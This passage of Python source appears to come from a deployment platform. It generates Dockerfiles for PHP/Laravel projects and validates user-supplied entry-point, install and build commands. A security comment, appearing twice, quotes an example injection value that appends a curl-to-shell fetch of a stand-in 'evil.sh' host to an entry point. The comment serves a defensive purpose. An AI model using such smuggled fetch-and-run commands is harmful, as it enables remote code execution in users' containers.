            "         --no-progress \\\n"
            "         --optimize-autoloader \\\n"
            "         --no-scripts \\\n"
            "    && test -f vendor/autoload.php \\\n"
            "    && echo 'composer install OK' \\\n"
            "    && chown -R www-data:www-data vendor 2>/dev/null || true\n"
        )
        # Insert after the last "COPY . /var/www/html" so sources exist first
        if re.search(r"^COPY\s+\.\s+/var/www/html/?\s*$", dockerfile, re.MULTILINE):
            # Insert after the LAST matching COPY (template may have only one)
            matches = list(
                re.finditer(
                    r"^COPY\s+\.\s+/var/www/html/?\s*$",
                    dockerfile,
                    flags=re.MULTILINE,
                )
            )
            if matches:
                m = matches[-1]
                dockerfile = (
                    dockerfile[: m.end()]
                    + "\n"
                    + composer_block
                    + dockerfile[m.end() :]
                )
            else:
                dockerfile = dockerfile.rstrip() + "\n" + composer_block
        else:
            dockerfile = dockerfile.rstrip() + "\n" + composer_block

        if logger:
            logger.info(
                "dockerfile_generation",
                f"Injected composer install at {app_root}.",
                progress=15,
                details={
                    "app_root": app_root,
                    "is_laravel": is_laravel,
                    "has_composer": has_composer,
                },
            )

    if writable_dirs:
        safe_dirs = [
            d.strip().lstrip("./")
            for d in writable_dirs
            if d and ".." not in str(d) and not str(d).startswith("/")
        ]
        if safe_dirs:
            dirs_str = " ".join(f"{app_root}/{d}" for d in safe_dirs)
            chmod_block = (
                "\n# --- Writable dirs (Laravel storage etc.) ---\n"
                f"RUN mkdir -p {dirs_str} "
                f"&& chown -R www-data:www-data {dirs_str} "
                f"&& chmod -R ug+rwx {dirs_str}\n"
            )
            dockerfile = dockerfile.rstrip() + "\n" + chmod_block

    # Always inject entrypoint when Laravel or composer project — the
    # entrypoint re-runs composer install if vendor/ is missing at runtime.
    need_entrypoint = is_laravel or bool(schema_files) or has_composer
    if need_entrypoint:
        script = _php_entrypoint_script(
            is_laravel=is_laravel,
            schema_files=schema_files,
            doc_root_rel=doc_root_rel or "",
        )
        b64 = base64.b64encode(script.encode("utf-8")).decode("ascii")
        entry_block = (
            "\n# --- PHP bootstrap entrypoint (composer + migrate) ---\n"
            f"RUN echo '{b64}' | base64 -d > /usr/local/bin/paas-php-entrypoint.sh \\\n"
            "    && chmod +x /usr/local/bin/paas-php-entrypoint.sh\n"
            'ENTRYPOINT ["/usr/local/bin/paas-php-entrypoint.sh"]\n'
        )
        dockerfile = _strip_cmd_entrypoint(dockerfile)
        dockerfile = dockerfile.rstrip() + "\n" + entry_block

    if logger:
        logger.info(
            "dockerfile_generation",
            "PHP runtime bootstrap configured.",
            progress=15,
            details={
                "is_laravel": is_laravel,
                "has_composer": has_composer,
                "schema_files": schema_files,
                "entrypoint": need_entrypoint,
            },
        )
    return dockerfile

def _render_php(dockerfile_template, tar_stream, config, logger):
    entry_point_override = None
    if config is not None:
        # SECURITY: validate user-supplied entry_point override before it
        # flows into supervisord command= or Dockerfile CMD.  Without this,
        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
        # arbitrary shell commands inside the container at runtime.
        _raw_ep = (config.entry_point or "").strip() or None
        if _raw_ep:
            try:
                entry_point_override = validate_shell_command(_raw_ep)
            except DeploymentValidationError:
                # Re-raise with a clearer message
                raise
        else:
            entry_point_override = None

    rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)

    user_doc_root = None
    project_cfg = None
    if config is not None:
        user_doc_root = getattr(config, "document_root", None)
        env = getattr(config, "environment", None) or {}
        if not user_doc_root and isinstance(env, dict):
            user_doc_root = (
                env.get("APACHE_DOCUMENT_ROOT")
                or env.get("DOCUMENT_ROOT")
                or env.get("document_root")
            )
            if user_doc_root and str(user_doc_root).startswith("/var/www/html"):
                user_doc_root = str(user_doc_root)[len("/var/www/html") :].lstrip("/")
        try:
            from .platform_bridge import get_project_cfg

            project_cfg = get_project_cfg(config)
        except Exception:
            project_cfg = None

    # Resolve platform early so Laravel gets forced defaults even when
    # archive inspection is incomplete.
    cfg_platform = ""
    if config is not None:
        cfg_platform = (getattr(config, "platform", None) or "").lower()
    forced_laravel = cfg_platform in (
        "laravel", "lumen", "symfony", "codeigniter",
    )

    doc_root_rel = _detect_php_document_root(
        tar_stream,
        user_override=user_doc_root,
        project_cfg=project_cfg,
    )

    # Laravel ALWAYS serves from public/ after flatten.  If detection
    # returned "" but platform is laravel, force "public".
    if forced_laravel and not doc_root_rel:
        doc_root_rel = "public"
    if project_cfg is not None and not doc_root_rel:
        fw = (getattr(project_cfg, "framework", None) or "").lower()
        if fw in ("laravel", "lumen", "symfony"):
            doc_root_rel = "public"

    if logger:
        absolute = (
            f"/var/www/html/{doc_root_rel}" if doc_root_rel else "/var/www/html"
        )
        logger.info(
            "dockerfile_generation",
            f"PHP Apache DocumentRoot set to '{absolute}'.",
            progress=14,
            details={
                "document_root": absolute,
                "document_root_rel": doc_root_rel or "",
                "platform": cfg_platform or "php",
                "forced_laravel": forced_laravel,
            },
        )

    if entry_point_override:
        rendered = _apply_php_document_root(rendered, doc_root_rel)
        return _replace_cmd(rendered, entry_point_override)

    if "docker-php-ext-install" not in rendered:
        rendered = rendered.replace(
            "COPY . /var/www/html/",
            "COPY . /var/www/html/\n\n"
            "RUN docker-php-ext-install mysqli pdo pdo_mysql opcache \\\n"
            "    && a2enmod rewrite headers \\\n"
            "    && sed -i 's/AllowOverride None/AllowOverride All/g' "
            "/etc/apache2/apache2.conf",
        )

    rendered = _apply_php_document_root(rendered, doc_root_rel)

    # Detect Laravel / schema.sql and inject composer + migrate entrypoint.
    php_info = _detect_php_project(tar_stream)
    composer_meta = php_info.get("composer") or {}

    # Force Laravel flags from platform name / project_cfg BEFORE version pick
    if project_cfg is not None:
        fw = (getattr(project_cfg, "framework", None) or "").lower()
        platform_name = (getattr(project_cfg, "platform", None) or "").lower()
        if fw == "laravel" or platform_name == "laravel":
            php_info["is_laravel"] = True
            php_info["has_artisan"] = True
            php_info["has_composer"] = True
    if forced_laravel:
        php_info["is_laravel"] = True
        php_info["has_artisan"] = True

    # PHP image version: this project's composer.json requires ^8.4 /
    # laravel 13 needs >=8.3.  Default image 8.2 causes composer install
    # to fail hard — rewrite FROM php:X.Y-apache accordingly.
    configured_php = None
    if config is not None:
        configured_php = getattr(config, "php_version", None) or (
            (getattr(config, "environment", None) or {}).get("php_version")
        )
    php_tag = _resolve_php_image_version(
        constraint=composer_meta.get("php_constraint"),
        is_laravel=bool(php_info.get("is_laravel") or forced_laravel),
        configured=str(configured_php) if configured_php else None,
    )
    rendered = re.sub(
        r"(php:)[^\s/]+(-apache)",
        lambda m: f"{m.group(1)}{php_tag}{m.group(2)}",
        rendered,
        count=1,
        flags=re.IGNORECASE,
    )
    if logger:
        logger.info(
            "dockerfile_generation",
            f"PHP image version set to {php_tag}.",
            progress=14,
            details={
                "php_version": php_tag,
                "constraint": composer_meta.get("php_constraint"),
                "is_laravel": bool(php_info.get("is_laravel") or forced_laravel),
            },
        )
        # Ensure composer runs even if archive inspection missed composer.json
        php_info["has_composer"] = True
        # Never skip install just because a partial vendor/ was in the zip
        if not php_info.get("has_vendor"):
            php_info["has_vendor"] = False
        extra = getattr(project_cfg, "extra", None) or {}
        if isinstance(extra, dict) and extra.get("writable_dirs"):
            php_info["writable_dirs"] = list(extra["writable_dirs"])
        else:
            php_info.setdefault("writable_dirs", [])
            for d in ("storage", "bootstrap/cache"):
                if d not in php_info["writable_dirs"]:
                    php_info["writable_dirs"].append(d)

    rendered = _inject_php_runtime(
        rendered,
        info=php_info,
        doc_root_rel=doc_root_rel or "",
        logger=logger,
    )

    if php_info.get("is_laravel") or forced_laravel:
        rendered = _inject_laravel_frontend_build(
            rendered,
            tar_stream=tar_stream,
            config=config,
            logger=logger,
        )
    return rendered


def _detect_laravel_frontend(
    tar_stream, *, logger=None, progress: int | None = None, project_model=None,
) -> dict:
    """Detect the frontend project inside a Laravel deployment archive.

    The archive is the build context.  The Laravel application root and the
    frontend project root are resolved independently so a layout such as::

        project/
          backend/        # Laravel
          frontend/       # Vite/React

    still builds ``frontend`` with the correct working directory while the
    runtime remains rooted at ``backend``.

    Returns a stable detection record including ``package_json_path`` and
    ``frontend_root`` (relative to the POST-FLATTEN build context; ``.``
    means the archive root).  Detection is delegated to
    ``project_model.build_project_model_from_tar`` so the same rules as the
    bridge/plugin layer apply; ``project_model`` (when already attached to
    the config) is used directly instead of re-walking the tar.
    """
    info: dict = {
        "kind": "",
        "has_package_json": False,
        "build_script": "build",
        "package_manager": "npm",
        "detected_files": [],
        "package_json_path": None,
        "frontend_root": None,
        "laravel_root": None,
    }
    if project_model is not None:
        model_info = frontend_info_from_model(project_model)
        if model_info is not None:
            info.update(model_info)
            if logger is not None:
                logger.info(
                    "frontend_detection",
                    f"Detected Laravel frontend kind='{info['kind'] or 'none'}', "
                    f"package_manager='{info['package_manager']}', "
                    f"build_script='{info['build_script']}', "
                    f"package_json='{info['package_json_path']}', "
                    f"frontend_root='{info['frontend_root']}'.",
                    progress=progress,
                    details={**info, "source": "project_model"},
                )
            return info
        # The model ran detection and found no frontend — still report the
        # Laravel application root so the runtime logs stay observable.
        info["laravel_root"] = getattr(project_model, "application_root", ".") or "."
        if logger is not None:
            logger.info(
                "frontend_detection",
                "No package.json found in the Laravel archive; no frontend build step will be injected.",
                progress=progress,
                details={**info, "reason": "no_package_json"},
            )
        return info

    if tar_stream is None:
        if logger is not None:
            logger.info(
                "frontend_detection",
                "Laravel frontend detection skipped: no tar stream available.",
                progress=progress,
                details={**info, "reason": "no_tar_stream"},
            )
        return info

    from .project_model import build_project_model_from_tar

    try:
        model = build_project_model_from_tar(tar_stream)
        model_info = frontend_info_from_model(model)
    except Exception as exc:
        if logger is not None:
            logger.warning(
                "frontend_detection",
                f"Laravel frontend detection failed: {exc}",
                progress=progress,
                details={"reason": "exception", "exception": str(exc)},
            )
        return info

    if not model_info:
        # No frontend detected — still report the Laravel application root
        # (post-flatten) so runtime logs stay observable.
        info["laravel_root"] = getattr(model, "application_root", ".") or "."
        if logger is not None:
            logger.info(
                "frontend_detection",
                "No package.json found in the Laravel archive; no frontend build step will be injected.",
                progress=progress,
                details={**info, "reason": "no_package_json"},
            )
        return info

    info.update(model_info)
    if logger is not None:
        logger.info(
            "frontend_detection",
            f"Detected Laravel frontend kind='{info['kind'] or 'none'}', "
            f"package_manager='{info['package_manager']}', "
            f"build_script='{info['build_script']}', "
            f"package_json='{info['package_json_path']}', "
            f"frontend_root='{info['frontend_root']}'.",
            progress=progress,
            details={
                **info,
                "flattened_wrapper": getattr(model, "flattened_wrapper", None),
                "applications": model.to_dict()["applications"] if hasattr(model, "to_dict") else [],
            },
        )
    return info


_DEFAULT_NPM_REGISTRY = "https://registry.npmjs.org"


def _resolve_frontend_npm_registry(config) -> str:
    """Return the npm registry mirror to use for the frontend build.

    Resolution order (first non-empty wins):
      1. ``config.frontend.npm_registry``  (tenant override in Deploy.config)
      2. ``config.environment.MIRROR_NPM``  (operator env-style override)
      3. The global ``mirror.npm`` SystemSetting, read via ``core.settings_service``
         (defaults to ``https://registry.npmjs.org``).

    The returned value is always a string. An empty string means "use the
    package manager's built-in default" — we still emit a `* config set
    registry` line for npm/pnpm/yarn when it differs from the public default
    so users behind a mirror (e.g. cnpm / ir npm) can install packages.
    """
    candidate = ""
    if config is not None:
        frontend = getattr(config, "frontend", None) or {}
        if isinstance(frontend, dict):
            candidate = (frontend.get("npm_registry") or frontend.get("registry") or "").strip()
        if not candidate:
            env = getattr(config, "environment", None) or {}
            if isinstance(env, dict):
                candidate = (env.get("MIRROR_NPM") or env.get("NPM_REGISTRY") or "").strip()
    if not candidate:
        try:
            from core import settings_service as svc
            candidate = (svc.mirror_npm() or "").strip()
        except Exception:
            candidate = ""
    # Fall back to the public default so the Dockerfile line is always valid.
    return candidate or _DEFAULT_NPM_REGISTRY


def _registry_config_line(package_manager: str, registry: str) -> str:
    """Return the shell snippet that points a package manager at ``registry``.

    Returns an empty string when ``registry`` is empty, when it equals the
    package manager's built-in public default (so we do not pollute the
    Dockerfile with redundant `config set` lines), or when the package
    manager has no `config set registry` command we can safely emit.
    """
    registry = (registry or "").strip()
    if not registry:
        return ""
    pm = (package_manager or "npm").strip().lower()
    builtin_defaults = {
        "npm": _DEFAULT_NPM_REGISTRY,
        "pnpm": _DEFAULT_NPM_REGISTRY,
        "yarn": _DEFAULT_NPM_REGISTRY,
    }
    if builtin_defaults.get(pm) == registry:
        return ""
    if pm == "npm":
        return f"npm config set registry {registry}"
    if pm == "pnpm":
        return f"pnpm config set registry {registry}"
    if pm == "yarn":
        # Yarn classic / berry both accept this form.
        return f"yarn config set registry {registry}"
    # bun does not currently expose a `config set registry`; users behind a
    # mirror can pass an explicit install_command if they need to.
    return ""


def _inject_laravel_frontend_build(
    dockerfile: str,
    *,
    tar_stream,
    config=None,
    logger=None,
) -> str:
    """Inject a real Node build for Laravel/Inertia/Vite projects.

    Build tooling is installed with dev dependencies because Vite/React/
    TypeScript normally live there. A failed build is fatal: silently
    accepting ``npm run build || true`` used to produce a healthy-looking
    Laravel container with missing frontend assets.

    The npm/pnpm/yarn registry is automatically pointed at the operator's
    configured mirror (``mirror.npm`` SystemSetting) when it differs from
    the public default. The tenant can override the mirror per-deploy via
    ``config.frontend.npm_registry``.
    """
    front = ""
    package_manager = "npm"
    build_command = None
    install_command = None
    frontend_source_kind = "auto"   # auto | user_override | env
    frontend_source_pm = "auto"
    if config is not None:
        frontend_options = getattr(config, "frontend", None) or {}
        frontend_options = dict(frontend_options) if isinstance(frontend_options, dict) else {}
        env = getattr(config, "environment", None) or {}
        if isinstance(env, dict):
            front = env.get("FRONT_BUILD_PLATFORM") or env.get("FRONTEND_BUILD") or ""
            if front:
                frontend_source_kind = "env"
        if not front:
            front = (
                frontend_options.get("platform")
                or frontend_options.get("kind")
                or getattr(config, "front_build_platform", None)
                or ""
            )
            if front:
                frontend_source_kind = "user_override"
        # Package manager can be supplied as:
        #   - config.frontend.package_manager  (newest, preferred)
        #   - config.package_manager            (top-level convenience field)
        pm_from_user = str(
            frontend_options.get("package_manager")
            or getattr(config, "package_manager", None)
            or ""
        ).strip().lower()
        if pm_from_user:
            package_manager = pm_from_user
            frontend_source_pm = "user_override"
        build_command = frontend_options.get("build_command") or frontend_options.get("command")
        install_command = frontend_options.get("install_command")

    # Prefer the ProjectModel attached by the detector layer (post-flatten
    # paths, single detection pass).  Only fall back to walking the tar
    # when the model is unavailable (detection skipped/failed).
    project_model = None
    if config is not None:
        project_model = getattr(config, "project_model", None)
    detected = _detect_laravel_frontend(
        tar_stream, logger=logger, progress=15, project_model=project_model,
    )
    kind = str(front or detected.get("kind") or "").strip().lower()
    if not kind and not detected.get("has_package_json"):
        # Detection already logged its own "no package.json" line above.
        return dockerfile
    if not kind:
        kind = "node"
    # Only fall back to the detected package manager when the user did
    # not explicitly provide one. This makes ``config.package_manager`` /
    # ``config.frontend.package_manager`` an actual override (otherwise
    # the detected value would silently win because of the OR chain).
    if not package_manager or package_manager == "npm":
        detected_pm = str(detected.get("package_manager") or "npm").lower()
        if detected_pm and detected_pm != "npm":
            package_manager = detected_pm
            if frontend_source_pm == "auto":
                frontend_source_pm = "auto_detected"
    package_manager = (package_manager or "npm").lower()
    if frontend_source_pm == "auto":
        frontend_source_pm = "auto_default"

    # Log which source was used for the kind + package_manager so the user
    # can verify their config (if any) was honored, or that auto-detect
    # took over when they did not supply one.
    if logger is not None:
        logger.info(
            "frontend_resolution",
            f"Using Laravel frontend kind='{kind}' (source={frontend_source_kind}), "
            f"package_manager='{package_manager}' (source={frontend_source_pm}).",
            progress=15,
            details={
                "kind": kind,
                "kind_source": frontend_source_kind,
                "package_manager": package_manager,
                "package_manager_source": frontend_source_pm,
                "user_supplied_build_command": bool(build_command),
                "user_supplied_install_command": bool(install_command),
                "frontend_root": detected.get("frontend_root"),
                "package_json_path": detected.get("package_json_path"),
            },
        )

    script = detected.get("build_script") or "build"
    frontend_root = str(detected.get("frontend_root") or ".").replace("\\", "/").strip().strip("/")
    if frontend_root in {"", "."}:
        frontend_root = "."
    elif frontend_root.startswith("/") or ".." in frontend_root.split("/"):
        raise DeploymentValidationError(
            f"Invalid detected frontend root: {frontend_root!r}",
            stage="frontend_detection",
        )

    frontend_prefix = (
        "/var/www/html" if frontend_root == "." else f"/var/www/html/{frontend_root}"
    )

    # Lock files must belong to the selected frontend project. A lockfile in
    # Laravel's root must never silently force the package manager for a
    # separate sibling frontend. The detection record already associates
    # the lockfile with the selected frontend's own directory.
    has_npm_lock = bool(detected.get("has_package_lock"))

    generated_install_command = {
        "npm": "npm ci" if has_npm_lock else "npm install",
        "pnpm": "corepack enable && pnpm install --frozen-lockfile",
        "yarn": "corepack enable && yarn install --frozen-lockfile",
        "bun": "npm install -g bun && bun install",
    }.get(package_manager, "npm install")
    install_command = str(install_command or generated_install_command).strip()
    generated_build_command = f"{package_manager} run {script}"
    build_command = str(build_command or generated_build_command).strip()

    # User-provided build/install overrides are deliberately restricted to a
    # single executable command. This keeps the new customization surface
    # useful without turning Deploy.config into arbitrary shell execution.
    if install_command != generated_install_command:
        install_command = validate_shell_command(install_command)
    if build_command != generated_build_command:
        build_command = validate_shell_command(build_command)

    # Never duplicate the injector if Dockerfile generation is called twice.
    if "# --- Laravel frontend build (injected) ---" in dockerfile:
        return dockerfile

    node_version = "20"
    if config is not None:
        rv = getattr(config, "runtime_version", None)
        if rv:
            m = re.search(r"(?:node)?\s*[>=~^]*\s*(\d{2})(?:\.\d+)?", str(rv), re.I)
            if m:
                node_version = m.group(1)

    # Resolve the operator-configured npm registry mirror and prepend a
    # `* config set registry <mirror>` step when it differs from the public
    # default. This is what makes `npm ci` / `pnpm install` work in
    # restricted-network regions without the user having to fork the
    # Dockerfile template.
    npm_registry = _resolve_frontend_npm_registry(config)
    registry_line = _registry_config_line(package_manager, npm_registry)

    install_lines = [
        "    && rm -rf /var/lib/apt/lists/* \\",
        f"    && cd {frontend_prefix} \\",
    ]
    if registry_line:
        install_lines.append(f"    && {registry_line} \\")
    install_lines.append(f"    && {install_command} \\")
    install_lines.append(f"    && {build_command}")
    # The last line must not end with a backslash, otherwise the Dockerfile
    # parser keeps waiting for the next line.
    install_lines[-1] = install_lines[-1].rstrip(" \\")

    block = (
        "\n# --- Laravel frontend build (injected) ---\n"
        f"# front_build_platform={kind}\n"
        f"# npm_registry={npm_registry}\n"
        "RUN apt-get update && apt-get install -y --no-install-recommends curl ca-certificates \\\n"
        f"    && curl -fsSL https://deb.nodesource.com/setup_{node_version}.x | bash - \\\n"
        "    && apt-get install -y --no-install-recommends nodejs \\\n"
        + "\n".join(install_lines) + "\n"
    )

    # The build must happen after COPY . /var/www/html. Insert immediately
    # before EXPOSE so the complete application source is available.
    if re.search(r"^EXPOSE\s+", dockerfile, re.M):
        dockerfile = re.sub(r"^(EXPOSE\s+)", block + r"\1", dockerfile, count=1, flags=re.M)
    else:
        dockerfile = dockerfile.rstrip() + "\n" + block

    if logger:
        # Identify which source the npm registry mirror came from so the
        # user can verify the operator-configured ``mirror.npm`` setting
        # is taking effect (or that they overrode it per-deploy via
        # ``config.frontend.npm_registry``).
        registry_source = "default"
        if config is not None:
            frontend_options = getattr(config, "frontend", None) or {}
            if isinstance(frontend_options, dict) and (
                frontend_options.get("npm_registry")
                or frontend_options.get("registry")
            ):
                registry_source = "user_override"
            else:
                env = getattr(config, "environment", None) or {}
                if isinstance(env, dict) and (env.get("MIRROR_NPM") or env.get("NPM_REGISTRY")):
                    registry_source = "env"
                else:
                    registry_source = "operator_setting" if registry_line else "default"
        logger.info(
            "dockerfile_generation",
            f"Laravel frontend build configured: kind='{kind}', "
            f"package_manager='{package_manager}', "
            f"frontend_root='{frontend_root}', "
            f"npm_registry='{npm_registry}' (source={registry_source}), "
            f"install='{install_command}', build='{build_command}'.",
            progress=15,
            details={
                "front_build_platform": kind,
                "kind_source": frontend_source_kind,
                "package_manager": package_manager,
                "package_manager_source": frontend_source_pm,
                "npm_registry": npm_registry,
                "npm_registry_source": registry_source,
                "npm_registry_config_line": registry_line or "(no override)",
                "install_command": install_command,
                "build_command": build_command,
                "frontend_root": frontend_root,
                "frontend_prefix": frontend_prefix,
                "detected_files": detected.get("detected_files", []),
                "package_json_path": detected.get("package_json_path"),
            },
        )
    return dockerfile



def _render_generic(platform, dockerfile_template, tar_stream, config, logger):
    entry_point_override = None
    if config is not None:
        # SECURITY: validate user-supplied entry_point override before it
        # flows into supervisord command= or Dockerfile CMD.  Without this,
        # a value like "gunicorn app:app; curl evil.sh | sh" would execute
        # arbitrary shell commands inside the container at runtime.
        _raw_ep = (config.entry_point or "").strip() or None
        if _raw_ep:
            try:
                entry_point_override = validate_shell_command(_raw_ep)
            except DeploymentValidationError:
                # Re-raise with a clearer message
                raise
        else:
            entry_point_override = None
    rendered = dockerfile_template.replace("{MIRROR_DOCKER}", MIRROR_DOCKER)
    if entry_point_override:
        rendered = _replace_cmd(rendered, entry_point_override)
    return rendered


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def _ensure_port_placeholder(dockerfile: str, port: int | None) -> str:
    """Replace residual ``{port}`` placeholders in the Dockerfile text."""
    if port is None:
        try:
            from core.global_settings.config import DEFAULT_EXPOSE_PORT
            port = DEFAULT_EXPOSE_PORT
        except Exception:
            port = 80
    try:
        port = int(port)
    except (TypeError, ValueError):
        port = 80
    return dockerfile.replace("{port}", str(port))


class DockerfileGenerator:
    def render(
        self,
        *,
        platform: str,
        dockerfile_template: str,
        tar_stream,
        config: DeploymentConfig | None = None,
        logger=None,
    ) -> str:
        if not dockerfile_template:
            raise DeploymentValidationError(
                "Dockerfile template is required.",
                stage="dockerfile_generation",
            )
        check_requirements_txt(tar_stream, platform=platform)
        check_package_json(tar_stream, platform=platform)
        platform = (platform or "").lower().strip()

        if platform == "django":
            rendered = _render_django(dockerfile_template, tar_stream, config, logger)
        elif platform in ("flask", "python", "fastapi"):
            rendered = _render_flask_or_python(
                platform if platform != "fastapi" else "python",
                dockerfile_template, tar_stream, config, logger,
            )
        elif platform in (
            "nodejs", "nextjs", "react", "vuejs", "vue", "angular",
            "vite", "express",
        ):
            rendered = _render_node_family(
                platform, dockerfile_template, tar_stream, config, logger,
            )
        elif platform in ("php", "laravel", "lumen", "symfony", "codeigniter"):
            # Keep original platform name on config so _render_php can force
            # Laravel DocumentRoot=public + composer + artisan migrate.
            rendered = _render_php(dockerfile_template, tar_stream, config, logger)
        elif platform == "go":
            rendered = _render_generic(platform, dockerfile_template, tar_stream, config, logger)
        else:
            rendered = _render_generic(
                platform, dockerfile_template, tar_stream, config, logger,
            )

        # Final pass: resolve any leftover {port} from Config templates.
        port = None
        if config is not None and getattr(config, "port", None) is not None:
            port = config.port
        rendered = _ensure_port_placeholder(rendered, port)
        return rendered

